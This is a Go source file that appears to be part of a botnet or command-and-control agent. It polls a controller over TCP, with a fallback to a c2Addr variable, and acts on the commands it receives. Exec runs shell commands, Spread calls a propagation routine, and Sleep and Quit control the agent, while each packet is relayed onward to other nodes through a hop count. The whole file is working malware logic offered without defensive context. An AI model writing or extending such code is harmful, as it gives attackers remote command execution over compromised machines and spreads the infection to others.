package main

import (
	"fmt"
	"net"
	"os"
	"time"
)

func poll(destination, source string) error {
	packet := AskPacket{
		Header: Header{
			PacketType: ASK,
			Source:     source,
			Hop:        0,
		},
	}
	bytes := packet.ToBytes()
	for {
		fmt.Println("Polling packet...")
		time.Sleep(10 * time.Second)
		ask(bytes, destination)
	}
}

func ask(bytes []byte, destination string) error {
	var err error
	defer fmt.Println(err)
	var conn net.Conn
	conn, err = net.Dial("tcp", destination)
	if err != nil {
		conn, err = net.Dial("tcp", c2Addr)
		fmt.Println(err)
	}
	defer conn.Close()
	_, err = conn.Write(bytes)
	if err != nil {
		return err
	}

	response := make([]byte, 1024)
	var n int
	n, err = conn.Read(response)
	if err != nil {
		return err
	}
	bytesResponse := response[:n]
	var packet Packet
	packet, err = Parse(bytesResponse)
	if err != nil {
		return err
	}
	fmt.Print("Found packet :")
	if _, ok := packet.(*EmptyPacket); ok {
		fmt.Println("Empty")
		return nil
	}

	switch p := packet.(type) {
	case *ExecPacket:
		fmt.Println("Exec")
		if p.Hop > 1 {
			p.Hop -= 1
			messages <- p
		}
		execute(p.Command)
	case *QuitPacket:
		fmt.Println("Quit")
		// TODO : wait for message to be polled
		if p.Hop > 1 {
			p.Hop -= 1
			messages <- p
		}
		os.Exit(0)
	case *SleepPacket:
		fmt.Printf("Sleep for %d\n", p.Time)
		if p.Hop > 1 {
			p.Hop -= 1
			messages <- p
		}
		go sleep(time.Duration(p.Time) * time.Second)
	case *SpreadPacket:
		fmt.Println("Spread")
		if p.Hop > 1 {
			p.Hop -= 1
			messages <- p
		}
		spread()
	default:
		panic(fmt.Sprintf("unexpected Packet: %#v\n", packet))
	}
	return nil

}
